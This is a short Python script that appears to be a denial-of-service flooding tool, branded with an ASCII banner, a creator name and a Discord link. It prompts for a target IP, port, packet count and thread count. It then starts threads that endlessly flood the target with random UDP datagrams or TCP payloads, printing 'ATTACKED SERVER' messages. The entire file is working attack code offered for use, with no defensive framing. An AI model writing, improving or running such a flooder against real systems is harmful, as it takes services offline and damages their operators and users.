import sys
import os
import random
import socket
import threading

os.system("clear")
print("""\x1b[1;92m
 ,--. ,--.                   
  |  .'   /,--. ,--.,--. ,--. 
  |  .   '  \  '  /  \  '  /  
  |  |\   \  \   '    \   '   
  `--' '--'.-'  /   .-'  /    
         `---'    `---'
 """)
print("↪ TOOLS INFORMATION ↩")
print("↪ CREATOR : KingsXinZu")
print("↪ VERSION : V4↩")
print("↪ COMMUNITY SERVER ↩")
print("↪ https://discord.gg/unkown↩")

ip = str(input("↪ IP :"))
port = int(input("↪ Port :"))
choice = str(input("↪ UDP Only (y/n)):"))
times = int(input("↪Packet :"))
threads = int(input(" ↪Thread :"))
os.system("clear")
def run():
	data = random._urandom(2000)
	i = random.choice(("[×]","[?]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" KYY ATTACKED SERVER!!!")
		except:
			print("[!] Connection Time Out")

def run2():
	data = random._urandom(20)
	i = random.choice(("[×]","[?]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" KYY ATTACKED SERVER!!!")
		except:
			s.close()
			print("[*] Connection Time Out")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()